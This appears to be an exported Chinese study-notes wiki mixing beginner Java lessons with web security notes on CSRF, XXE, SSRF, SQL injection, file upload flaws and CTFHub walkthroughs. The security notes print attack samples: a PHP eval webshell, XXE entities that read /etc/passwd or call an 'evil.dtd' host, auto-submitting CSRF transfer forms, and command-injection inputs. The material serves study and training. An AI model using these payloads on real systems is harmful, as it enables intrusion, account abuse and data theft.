域名解析查询：[dbcha.com](http://dbcha.com/)\n  \n  收集工具：\n  \n  [What's that site running? | Netcraft](https://sitereport.netcraft.com/)\n  \n  ![](https://tc3.doingnothing.online/assets/image_1678612281502_0.png)\n  \n  [在线域名解析记录检测-在线Nslookup域名解析查询工具 (jsons.cn)](http://www.jsons.cn/nslookup/)\n  \n  ![](https://tc3.doingnothing.online/assets/image_1678612445424_0.png){:height 370, :width 744}\n  \n  kali中的工具maltego（全英文，比较复杂）","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/01-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86":{"title":"01-文件上传漏洞的原理","content":"\n\n- 文件上传漏洞主要是利用一些上传文件的一些地方，利用服务器去执行文件中的一些命令，来达到非法攻击的目的。\n- 比如一句话木马，通过访问服务器的一句话木马文件，将要执行的命令作为参数传递过去，服务器就会将其作为命令执行。\n```\n  \u003c?php @eval($_POST['wuya']);?\u003e\n```\n- Java： `Runtime.getRuntime().exec(command);`","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/01-csrf%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86":{"title":"01-csrf漏洞基本认识","content":"\n\n- Cross-Site Request Forgery 跨站请求伪造\n  \n  tips：\n  \n  \u003e \n  \n  一个网站根据referer字段，简单判断是否上一个是否来自于自己的网站发起的请求，不过也可以伪造。\n- # 基本介绍\n  \n  原理描述：\n- \u003e 就是对本来官方的请求进行伪造，然后做一个虚假的网站，将你伪造的请求放在里面，别人点击或者打开，就会使用你本来已经登录过的官网的cookie或者身份认证，来实现恶意操作。\n- 举例：\n- \u003e 使用伪造的qq网站，以及伪造的请求，来对你的qq进行非法操作，比如常见的发消息、乱发邮件等等。\n- 和xss的区别：\n- xss获取到基本都是cookie，而csrf漏洞则是使用伪造的请求，骗你无意中进行操作。\n- ![原理图](https://tc3.doingnothing.online/imgs/202303302121567.png)\n- 危害\n- 修改账户信息\n- 利用管理员账号，上传木马文件\n- 传播蠕虫病毒（点击、扩散、点击……）\n- 和其他攻击手段配合，实现攻击，比如XSS、SQL注入","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/01-ctfub-evel":{"title":"01-ctfub-evel","content":"\n\n- [[远程代码执行]]\n- [[../../../../pages/04-ctfhub]]中的[[evel]]关卡\n- 在rce里面的evel执行里面\n- 创建环境之后，点击链接可以直接看到命令代码\n- 然后将这个url放到[[../../../../pages/中国蚁剑]]中，输入密码`cmd`，注意开启代理，因为网站可能在国外，不然连接不上\n- 此处我使用了中国菜刀，因为刚开始我遇到了[[问题]]没有开启代理，我以为是工具的问题\n- ![image.png](../../../assets/image_1682148259444_0.png)\n- 打开根目录的flag文件，就找到钥匙了。","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/01-http%E5%8D%8F%E8%AE%AE%E5%B8%B8%E7%94%A8%E7%9A%84%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F":{"title":"01-http协议常用的请求方式","content":"\npublic:: true\n\n- 常用的请求方式\n  ![](https://tc3.doingnothing.online/imgs/202303301634125.png){:height 286, :width 776}","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/01-xml%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86":{"title":"01-xml基础知识","content":"\n\n- #网安\n- [[about]] :: [XML基础知识归纳（通俗易懂） - BWH_Steven - 博客园 (cnblogs.com)](https://www.cnblogs.com/ideal-20/p/11364679.html)\n- xml：可扩展标记型语言，和`json`一样，都是用来封装数据的，只是封装的格式不一样\n\t- 标记型：通过类似于html那样的标签来进行标记，不是编程语言，和html是标记语言\n\t- 可扩展：标签可以自己进行定义\n- 用途：用于做**配置文件**、或者**小型数据库**，在网络中传输数据\n\t- 配置文件，比如java项目`jdbc.properties`、javaweb中都有使用\n\t- 也可以用于**传输数据**，比如在不同的操作系统中传输数据\n- 文档后缀： `.xml`\n- ## 一个完整的xml的内容\n- ![image.png](../../assets/image_1681731292077_0.png){:height 362, :width 399}\n- ##  基本语法\n- 文档声明：声明这是一个xml文档\n- ```\n  \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n  ```\n\t- **encoding**：xml编码 常见编码： GBK、UTF-8、ISO8859-1(不包含中文)\n\t- **standalone**：是否需要依赖其他文件 yes/no\n- 标签的定义，需要遵循严格的规范(**格式要求**）\n\t- 必须有根标签元素\n\t- 有始有终，**必须成对**\n\t- 标签嵌套正确，嵌套应该规范嵌套 `\u003caa\u003e\u003cbb\u003e\u003c/bb\u003e\u003c/aa\u003e`\n\t- **大小写敏感**\n\t- **属性必须加引号**\n\t- 空格和换行均当做内容来进行解析，需要注意缩进问题\n- DTD（Document Type Definition ）**文档类型定义**：用来定义元素与实体的顺序等规则，主要是为了**约束xml文档**,由以下部分构成\n\t- 元素ELEMEN\n\t- 实体ENTITY\n\t\t- 实体分为内部实体和外部实体，==外部实体现在浏览器基本都不支持使用==\n- 注释的使用\n\t- ```xml\n\t  \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\t  \u003c!-- xml注释 --\u003e\n\t  ```\n-\n- ## 外部实体引用：协议\n  id:: 643d2e1c-beb3-4e6b-95e3-b1bf66e3d461\n- ```\n  file\tfile:///etc//passwd\n  php\t\tphp:/filter/read=convert.base64-encode/resource=index.php\n  http \thttp://wuya.com/evil.dtd\n  ```\n- ## 不同语言支持的协议\n- ![image.png](../../assets/image_1681731250514_0.png){:height 142, :width 301}\n- ## PHP扩展\n- ![image.png](../../assets/image_1681731271195_0.png){:height 394, :width 336}","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/01.%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5":{"title":"01.什么是SQL注入","content":"\n\n- SQL注入即是指[web应用程序](https://baike.baidu.com/item/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/2498090)对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的[SQL语句](https://baike.baidu.com/item/SQL%E8%AF%AD%E5%8F%A5/5714895)，在管理员不知情的情况下实现非法操作，以此来实现欺骗[数据库服务器](https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8/613818)执行非授权的任意查询，从而进一步得到相应的数据信息\n- ### web应用程序三层架构：视图层 + 业务逻辑层 + 数据访问层\n  \n  ![](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644920322000/ed5994b0523a48ea91a9dd7df3629ac2.png){:height 332, :width 776}","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/010-obsidian%E6%8F%92%E4%BB%B6":{"title":"010-obsidian插件","content":"\n\n- Wikilinks to MDLinks：wiki链接转换成markdown链接 `[[]]`转换成`[]()`\n- Remotely Save：同步插件\n- Clear Unused Images：清理没用的图片\n- Templater:功能强大的模板插件\n- Image Toolkit：图片工具，可以用于放大查看，简单的旋转复制等等\n- kanban：看板工具","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/010_%E7%AC%A6%E5%8F%B7%E5%AE%9A%E4%B9%89":{"title":"010_符号定义","content":"# 010_符号定义\n\n# 标识符\n\u003e1. 程序员有权利自己命名的单词\n\u003e1. 通常用于设置方法名、接口名、常量名、等等\n\n一般采用*驼峰*命名\nStudentName\n\n# 关键字\n\u003e具有特殊含义的单词，比如`Public`,\t`static`\n![[../../../../assets/Pasted image 20220623184204.png]]","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/011_javadoc%E7%9A%84%E4%BD%BF%E7%94%A8":{"title":"011_javadoc的使用","content":"# 011_javadoc的使用\n\n1. 先在源文件中进行javadoc注释\n2. ![](asset/Pasted image 20220623190413.png)\n\n1. 使用命令javadoc执行生成文档\n\t命令格式为\n```shell\n\t\tjavadoc -d 生成文档放入的目录 -附件参数（比如作者author等等） java源文件\n```\n![](asset/Pasted image 20220623185936.png)\n\n\u003e如果不添加参数，默认几乎所有参数都会参与生成\n1. 在文件夹下打开index.html文件即可查看![](asset/Pasted image 20220623190646.png)","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/012_%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8D%A0%E7%94%A8%E5%A4%A7%E5%B0%8F":{"title":"012_不同数据数类型占用大小","content":"# 012_不同数据数类型占用大小\n\n|类型|占用字节数量|\n|--|--|\n|byte|1|\n|short|2|\n|int|4|\n|long|8|\n|--|--|\n|float|4|\n|doubl|8|\n|boolean|1|\n|char|2|","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/013_%E6%8E%A5%E6%94%B6%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5":{"title":"013_接收键盘输入","content":"# 013_接收键盘输入\n\n# 接收方法\n1. 导包方式\n\t```java\n\t\timport java.util.Scanner;\n\t```\n\t定义键盘扫描对象\n```java\n\tScanner s=new Scanner(System.in);\n\tint a=s.nextInt() //接收用户输入的整型变量\n---\n2. 直接在对应内容中定义*输入扫描器*对象\n```java\n\tjava.util.Scanner s=new java.util.Scanner(System.in);\n\tint a=s.nextInt()\n```\t\t\n# 接收不同的数据格式\n```java \n\tint a=s.nextInt(); //整型\n\tlong l=s.nextLong(); //长整型\n\tfloat f=s.nextFloat();//浮点型\n\tdouble d=s.nextDouble();//双精度浮点数\n\tboolean b=s.nextBoolean();//布尔\n\t\n//字符串类型\n\tString str=s.next();//空格或者换行结束输入\n\tString str=s.nextLine();//以换行结束输入，更香一点，但我不习惯用\n```","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/014_%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8":{"title":"014_方法的调用","content":"# 014_方法的调用\n\n```java\n\tpublic class Tmp {\n\n    public static void main(String[] args) {\n\n        Dayin.dayin();//跨类调用，在前面加上类名.\n\n    }\n\n}\n\n\n\nclass Dayin {\n\n    public static void dayin(){\n\n        System.out.println(\"打印1\");\n\n    }\n\n}\n```\n1. 在定义class的时候，**每一个文件最多只能有一个公开的public 类（class）**\n2. 在一个类中，需要调用其他方法，可以直接采用 `方法名(参数列表)`的方式去进行调用\n3. **如果不在一个类中**，则需要在前面加入**类名.**才能进行调用，如Dayin.dayin()\n4. 方法可以不返回值，也可以返回值不进行接收。当不需要进行返回的时候，可以使用void对返回值类型进行定义。\n5. **调用方法不一定用main方法去进行调用，也可以通过别的方法去简洁进行调用，采用多个方法可以将过程层次化，调用和组装心方法更加简单。**\n","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/015_break%E5%92%8Creturn%E7%9A%84%E5%8C%BA%E5%88%AB":{"title":"015_break和return的区别","content":"# 015_break和return的区别\n\nbreak用于停止循环和switch\nreturn用于返回一个方法的返回值，用即停止这个方法，**不会执行后面的语句**\n\n**return 不负责运行程序，只负责讲道理。对于不能百分之百能够返回值的方法，都会编译错误**","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/016_%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E6%97%B6%E5%86%85%E5%AD%98%E5%8F%98%E5%8C%96":{"title":"016_方法执行时内存变化","content":"# 016_方法执行时内存变化\n\n# 基本\n局部变量 只在方法体重有效，方法借宿之后，局部变量就释放了。局部变量一般在循环中或者方法函数中。\nJVM中有三块主要的内存：**栈内存**、**堆内存**、**方法区内存**\n堆\n## 栈\n\u003e栈：方法函数调用的时候，方法所需要的内存在栈中进行分配。!\n\n![[../../../../assets/Pasted image 20220628094821.png]]\n如图，由于栈是先进后出，所以在依次嵌套的方法函数调用的时候，**最先调用的函数，最后结束**，符合栈的先进后出\n\n\u003e调用的时候在栈中**分配空间**，叫压栈push\n\u003e结束的时候，**内存释放**，叫弹栈pop","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/017_%E6%96%B9%E6%B3%95%E9%87%8D%E8%BD%BDoverload":{"title":"017_方法重载overload","content":"# 017_方法重载overload\n\n## 用途\n\u003e 主要用在多个具有相似功能的方法函数中\n\u003e 通过将方法函数名称设置为相同，由java自己通过参数列表去判断执行具体的哪一个方法\n\u003e 让代码更加美观\n\n## 执行重载的条件\n1. 方法名称相同\n2. 参数列表**不同** （也就是形参列表）\n\t\u003e    参数的**个数**不同\n\t\u003e   参数的**顺序**不同\n\t\u003e   参数的****不同\n\n**只要能够让java编译器能够区分具体执行哪个方法的参数列表就行**\n## 注意\n\u003e **在同一个类中的方法，才叫重载**\n\u003e 重载和返回值类型无关，主要是根据形参列表去判断是否是重载的方法函数","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/02-%E4%BB%80%E4%B9%88%E6%98%AFcookie":{"title":"02-什么是cookie","content":"\n\npublic:: true\n\n- cookie主要作用是**保持会话**，其内容是`key=value`的格式存在。 使用cookie不仅可以记住用户登录的状态，还可以跟踪用户的行为（比如平时手机推送的广告等等可能会根据你浏览数据的记录存入cookie中，个性化推送广告）\n  \n  当第一次浏览器进行访问的时候，会在电脑设置cookie，之后访问都会携带电脑存储的cookie内容。\n  \n  Set-Cookie：第一次访问，服务器响应给客户端\n  Cookie：之后的访问，客户端发送给服务器\n## cookie的一些常用参数\n\n| MIME | 描述 |\n| ---- | ---- | ---- |\n| name=value | cookie的键值对（必需） |\n| expires | cookie的过期时间 |\n| max-age | cookie多久过期（单位是秒） |\n| domain | cookie对哪个域名生效 |\n| path | cookie匹配的路径 |\n| secure | 只有HTTPS连接，才发送cookie到服务器 |\n| httponly | 不允许通过脚本document.cookie去更改这个值 |\n# cookie的存储\n\n**如果没有设置有效期，那么就是存储在内存中的，关闭了就没有了。** 如果是有设置有效期，那么就是存储在磁盘上的。\n## cookie的特点\n- 明文\n- 可以修改\n- 大小受到浏览器的限制","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/02-SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1":{"title":"02-SSRF漏洞的防御","content":"\n\n- 1、禁用协议：禁用一些http等之外的协议\n  2、限制请求端口：限制一些特殊的端口，只能访问80、8080等端口\n  3、设置URL白名单：限制只能请求特定的一些url范围或者正则规范\n  4、过滤返回信息：只能返回一些过滤的信息\n  5、统一错误信息：如果返回错误，就封装错误信息，隐藏真正的返回信息","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/02-XXE%E6%BC%8F%E6%B4%9E":{"title":"02-XXE漏洞","content":"\n\n- XXE漏洞主要是通过**外部实体引入**的方式进行攻击的（有点类似于文件包含漏洞）\n- 外部实体ENTITY的使用\n\t- ![image.png](../../assets/image_1681719026801_0.png){:height 213, :width 517}\n- ## 攻击流程\n- 1、确定使用XML传输数据（抓包可得）\n  2、发送到Repeater\n  3、添加DTD，引用外部问文档\n  4、Send得到响应\n- ## 盲打-DNSLog\n- 由于没有回显，可以通过访问dns服务器，**根据dns服务器是否有解析记录**，判断是否有攻击成功\n- 过程\n\t- 在dnslog生成一个子域名[DNSLog Platform](http://www.dnslog.cn/) ![image.png](../../assets/image_1681731707001_0.png)\n\t- 将子域名添加到下列的xml中\n\t- ```XML\n\t  \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\t  \u003c!DOCOTYPE root[\n\t  \u003c!ENTITY % reomote SYSTEM \"http://ran258.dnslog.cn\"\u003e%remote;\n\t  ]\u003e\n\t  ```\n\t- 发送数据包之后，在dnslog中查看是否有留下dns解析记录，如果有就说明成功，有xxe漏洞\n- ## 盲打-http接口参数，写入文件\n- 1. 上传第一个xml访问外部实体，实际访问的是p2图片的内容，然后请求本地的资源，发送到指定的url\n- ![image.png](../../assets/image_1681733543512_0.png){:height 147, :width 622}\n- ![image.png](../../assets/image_1681733548195_0.png)\n-","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/02-csrf%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B":{"title":"02-csrf漏洞案例","content":"\n\npublic:: true\n\n- 1. 通过图片的img src属性，自动加载，发起GET请求\n- ```\n  \u003cimg src=\"http://superbank.com/bank/transfer.php?nameid=20\n  02\u0026amount=1000\" width=\"0\" height=\"0\"\u003e\n  ```\n- 2. 构建一个超链接，用户点击以后，发起GET请求\n- ```\n  \u003ca href=\"http://superbank.com/transfer.php?amount=1000\u0026\n  to=jiangang\" taget=\"_blank\"\u003e\n  小姐姐在线视频聊天！！\n  \u003ca/\u003e\n  ```\n- 3. 构建一个隐藏表单，用户访问，自动提交，发起POST请求\n- ```\n  \u003cform action=\"http://superbank.com/withdraw\" method=POST\u003e\n  \u003cinput type=\"hidden\" name=\"account\" value=\"xiaoming\" /\u003e\n  \u003cinput type=\"hidden\" name=\"amount\" value=\"1000\" /\u003e\n  \u003cinput type=\"hidden\" name=\"to\" value=\"jiangang\" /\u003e\n  \u003c/form\u003e\n  \u003cscript\u003e document.forms[0].submit(); \u003c/script\u003e\n  ```","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/02-ctfhub-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5":{"title":"02-ctfhub-命令注入","content":"\n\n- 输入`127.0.0.1 | ls`，查看当前目录的文件 ![image.png](../../../assets/image_1682148623739_0.png)\n- 然后 `127.0.0.1；cat 99582115114239.php`这个文件，查看具体的内容，发现其没有正常显示 ![image.png](../../../assets/image_1682148702347_0.png)\n- 转换成base64进行显示 `127.0.0.1|cat 99582115114239.php|base64`，发现显示出来了\n- ![image.png](../../../assets/image_1682148797166_0.png)\n- 使用base64转换工具转换回去 [Base64 编码/解码 - 在线工具 (toolhelper.cn)](https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode)\n- ![image.png](../../../assets/image_1682148851859_0.png)","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/02-ip%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86":{"title":"02-ip信息收集","content":"\n- dns解析的查询过程有两种 一种是迭代查询，我告诉你去哪个服务器查询，你自己去那个服务器查询 另一种是递归查询，你告诉我你要查什么，我去帮你查询，依次递归返回结果，我把结果告诉你\n  \n  常用命令 ping nslookup：`nslookup -type= \"MX\"`\n  \n  查看ip归属信息： [Whois (cnnic.net.cn)](https://ipwhois.cnnic.net.cn/) 可以查看大陆ip归属信息 [iP地址查询--手机号码查询归属地 | 邮政编码查询 | iP地址归属地查询 | 身份证号码验证在线查询网 (ip138.com)](https://www.ip138.com/)\n  \n  #CDN CDN：内容分发网络 常用CDN服务商 [CloudFlare](https://wiki.doingnothing.online/#CloudFlare)/[CloudFront](https://wiki.doingnothing.online/#CloudFront)...... 帝联/蓝讯/网宿/七牛云/腾讯/百度/阿里云\n  \n  [question](https://www.notion.so/question-be0e53e646ac4a04a334762b64f6d404) 如何获取经过CDN的真实IP？\n- 超级ping [多个地点Ping服务器,网站测速 站长工具 (chinaz.com)](https://ping.chinaz.com/)\n- 历史dns 查看历史dns [DNS History](http://dnshistory.org/)\n- 通过子域名查询ip [sitereport | Netcraft](https://sitereport.netcraft.com/)\n- 国外主机解析：国外可能没有设置CDN服务器，就会直接访问真实ip主机\n- [https://asm.ca.com/zh_cn/ping.php](https://asm.ca.com/zh_cn/ping.php)\n- [http://host-tracker.com/](http://host-tracker.com/)\n- [http://www.webpagetest.org/](http://www.webpagetest.org/)\n- [https://dnscheck.pingdom.com](https://dnscheck.pingdom.com/)\n- 其他，邮件(点击显示原文，可能会有显示），ssl证书，手机抓包，网络空间搜索引擎 先判断是否使用了CDN：通过不同地方的服务器来对网站进行访问，看看是否返回的IP是一样的，如果不一样，就基本是CDN ： [DNS History](http://dnshistory.org/)","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/02-php%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE":{"title":"02-php中文件上传漏洞相关函数和伪协议","content":"\n\n- ## 相关函数\n- 函数一\n- |函数|作用|\n  |--|--|\n  |nclude()|include 语句包含并运行指定文件|\n  |include_once()|只包含一次，不重复包含|\n  |require()|和include一样，不过出错时会停止|\n  |require_once()|和include_once一样|\n  |fopen()|打开文件或者 URL|\n- 函数二\n- |函数|作用|\n  |--|--|\n  |readfile|读取文件并写入到输出缓冲。|\n  |highlight_file|语法高亮一个文件|\n  |show_source|等于highlight_file()|\n  |file_get_contents|将整个文件读入一个字符串|\n  |file|把整个文件读入一个数组中|\n- ## 伪协议\n- ![](https://tc3.doingnothing.online/imgs/202304111555731.png)\n- 使用：`parse_str(file_get_contents('php://input'), $_PUT);`\n- 了解：[php中的伪协议](https://www.php.net/manual/zh/wrappers.php)\n  id:: 643512c6-6a53-46c1-a204-742947900230","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/02-webshell%E5%B7%A5%E5%85%B7":{"title":"02-webshell工具","content":"\n\n# webshell分类\n- 一句话木马： 代码短，只有一行代码。\n  场景多，可以单独生成文件，也可以插入到图 片中。\n  安全性高，隐匿性强，可变形免杀\n- 小马：体积小，功能少，只有文件上传功能\n- 大马：功能强、体积大，管理数据库、**提权**、控制计算机、文件管理等等\n# webshell工具集合\n\nhttps://github.com/tennc/webshell\n包含了各种语言的webshell工具","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/02.SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E8%AF%AD%E5%8F%A5%E8%AF%AD%E6%B3%95":{"title":"02.SQL注入之MYSQL语句语法","content":"\n\n# SQL注入之数据库概述\n\n数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。\n### 关系型数据库\n\n关系型数据库，存储的格式可以直观地反映实体间的关系，和常见的表格比较相似\n\n关系型数据库中表与表之间有很多复杂的关联关系的\n\n常见的关系型数据库有MySQL，Orcale，PostgreSQL , SQL Server等。\n### 非关系型数据库\n\n随着近些年技术方向的不断扩展，大量的NoSQL数据库如 Mon goDB，Redis出于简化数据库结构，避免冗余，影响性能的表连接。摒弃复杂分布式的目的被设计\n\nNoSQL数据库适合追求速度和可扩展性，业务多变的场景\n\n[数据库排行：https://db-engines.com/en/ranking](https://db-engines.com/en/ranking)\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644920636000/061b29bf0a964fc09f9db997b127a63e.png)\n- ### **数据库服务器层级关系：**\n  \n  服务器里面\n  ：多个数据库\n  ：多个数据表\n  ：多个行 列  字段\n  ： 数据\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644920636000/4d27fc6e0941461193ba75ebcaafce1b.png){:height 241, :width 733}\n### SQL语句语法回顾：\n\n```\n查询当前数据库服务器所有的数据库\n     show databases;\n     选中某个数据库\n     use 数据库名字 test\n     查询当前数据库所有的表\n     show tables；\n     查询t1表所有数据\n     查询关键 select \n     * 所有\n     from  表名\n     select * from t1;\n     条件查询 id=2\n     where 条件  编程 if（条件 true）{执行}\n ​\n     select * from t1 where id=2；\n     查询id=2   pass =111\n     union 合并查询 \n     2个特性：\n     前面查询的语句 和 后面的查询语句 结果互不干扰！\n     前面的查询语句的字段数量 和 后面的查询语句字段数量  要一致\n ​\n     * == 3\n     select id from t1 where id=-1 union select * from t1 where pass =111;\n ​\n     order by 排序\n     order by 字段名字  id  也可以 跟上数字 1 2 3 4 .。。。。。\n ​\n     猜解表的列数 知道表有几列\n```","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/021_%E9%80%92%E5%BD%92":{"title":"021_递归","content":"# 021_递归\n\n\n1. 递归方法必须有结束条件，否则就会`栈溢出错误`，因为**没有结束的条件**，递归会一直不断地执行新的自己的方法，导致栈溢出。\n2. 递归有结束条件，但也会发生栈溢出，因为递归太深了，自身的栈内存不够用了，一直不断地压栈。\n3. 递归不断的循环，可能会导致JVM死掉，**非常耗费内存**\n4. **能用for或者while替换，尽量不用递归**\n\n## 书写思路\n1. 如何进入循环的，比如阶乘，是根据此一个值去乘以-1之后的方法，然后再加上自己自己本身，`sum(n-1)+1`\n2. 更重要的是停止方法的条件，如何将自己停止，一般是需要返回值，特殊的条件是什么样的，返回什么值。\n\t```java\n\tif(a!=0) {\n\n\t\t\t   sum(a);\n\n\t\t\t}\n\t```\n\n---\n如果栈溢出怎么解决\n\u003e 检查递归结束条件\n\u003e 手动调整JVM的栈内存，调大点\n\u003e 继续扩大栈内存大小\n\n\n求1+到n\n```java\n    public static int dgSum(int a) {\n\n        if(a!=0) {\n\n           sum(a);\n\n        }\n\n        return sum(a);\n\n    }\n```\n\n或者\n```java\n    public static int sum(int n) {\n\n        if (n==0) {\n\n            return 0;\n\n        }\n\n        return sum(n-1)+n;\n\n    }\n```","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/022_%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B":{"title":"022_面向对象和面向过程","content":"# 022_面向对象和面向过程\n\n## 常见语言\nC是面向过程\nC++是一般面向过程，一般面向对象\njava是完全面向对象\n\n## 面向过程\n1. 面向过程注重步骤，注重实现这个功能的因果关系，每一步之间的因果关系，联系形成子模块，**耦合度高**，**扩展能力就差**\n2. 对于小型项目，面向过程方便直接开发，效率高，快速开发\n\n## 面向对象\n1. 面向对象符合人类的思维方式，将世界分割成不同的单元形成驱动，然后驱动各个对象，形成一个系统\n2. **耦合度低**，**扩展能力强**\n3. **三大特征**：封装 继承 多态 ^sandatezheng\n\t有了封装才能说继承，有了继承，才能说多态 ^c344fe\n\n\n\u003e 当我们采用面向对象的方式贯穿系统，需要\n\u003e OOA 面向对象分析\n\u003e OOD 面向对象设计\n\u003e OOP 面向对象编程\n","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/023_%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%B1%BB":{"title":"023_对象和类","content":"# 023_对象和类\n\n## 简要\n类是抽象的概念，好像一个**模板**\n对象是一个实际存在的个体，对象的另一个名称就是**“实例”**\n通过类创建对象的过程，称为**“实例化”**\n根据多个对象的**共同属性**抽取形成的概念，叫做**“抽象”**\n```mermaid\ngraph LR\n\tl1(对象)\n\tl2(类)\n\tl1--抽象--\u003el2\n\tl2--实例化--\u003el1\n```\n \n\n## 举例\neg\n\u003e 明星是一个类\n\u003e 宋小宝，姚明就是一个实际的对象\n## 注意\n在java中，必须先定义“类”，才能够创建“对象”\n类就是一个模板，描述类中所有对象的共同特征或者属性\n\n## 定义类\n类一般包括了对象的属性特征，以及对象的方法\n比如\n```java\npublic class Student(){\n\t姓名\n\t性别\n\t身高\n\t\t\n\t打篮球(){\n\t}\n\t唱歌(){\n\t}\n\t跳舞(){\n\t}\n\trap(){\n\t}\n}\n```\n\n```java\npublic class Test(){\n\tpublic static void main(String[] args){\n\t\tStudent s=new Student();\n\t\t\n\t}\n}\n```\n\n\u003e **方法体中**的生命变量叫做**局部变量**，s.身高，s.性别就是局部变量\n\u003e **方法体外,类体内定义**的变量，叫做**成员变量**，也就是类体中（class中）的属性变量，实例变量不能用类名去访问，必须创建对象之后，通过对象去进行访问","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/024_%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA":{"title":"024_对象的创建","content":"# 024_对象的创建\n\n## 创建对象\n通过`new`来创建一个对象\n对象存储在**“堆”**当中\n\u003e 堆内存中存储对象，以及对象的实例变量\n\u003e **实例变量就是对象变量，也就是对象的属性，例如student.name**\n\n局部变量存储在**栈内存**中\n```java\n\t类名 变量名=new 类名();\n```\n\n\u003eJava中所有的类，都是一个数据类型，且都是引用数据类型\n\u003e一般在进行调用的时候，是调用的对象的地址，而不是对象本身。\n\u003e比如 在`Student s=new Student();`中，进行调用s的时候，是对其s的对象地址进行调用，而不是对象本身，所以类都是引用数据类型的。\n1. 抽象一个学生类，定义其中的属性\n\t```java\n\tpackage a001对象的创建;\n\tpublic class Student {\n\t\tint xueHao;\n\t\tString xingMing;\n\t\tint nianLing;\n\t\tboolean xingBie;\n\t\tString zhuZhi;\n\n\t}\n\t```\n2. 通过定义的类，来创建一个对象\n\t```java\n\tpackage a001对象的创建;\n\n\tpublic class StudentTest {\n\n\t\tpublic static void main(String[] args) {\n\n\t\t\tStudent s=new Student(); //实例化之后的对象，通过s引用s所在的对象，s是对象的地址，并不是对象本身\n\n\t\t}\n\n\t}\n\t```\n\n## 编译过程\n1. 在编译`StudentTest.java`的过程时，按理来说，是先编译类文件`Student.java`，然后才编译`StudentTest.java`文件\n2. 但是现在的编译器已经做到能够自己去寻找其中所定义的类，所以可以直接编译`Student.java`文件，编译器会**自动**去查找Student类所属的文件对其进行编译\n---\n## 对实例化变量进行赋值\n```java\n\t        //对实例变量进行赋值\n\n        iKun.xingMing=\"蔡徐坤\";\n\n        iKun.xingBie=true;\n\n        iKun.nianLing=24;\n\n        iKun.xueHao=20191045;\n\n        iKun.zhuZhi=\"基尼太美星球\";\n\n        //对实例对象的变量进行打印\n\n        System.out.println(\"姓名：\\t\"+iKun.xingMing);\n\n        System.out.println(\"性别：\\t\"+iKun.xingBie);\n\n        System.out.println(\"年龄：\\t\"+iKun.nianLing);\n\n        System.out.println(\"学号：\\t\"+iKun.xueHao);\n\n        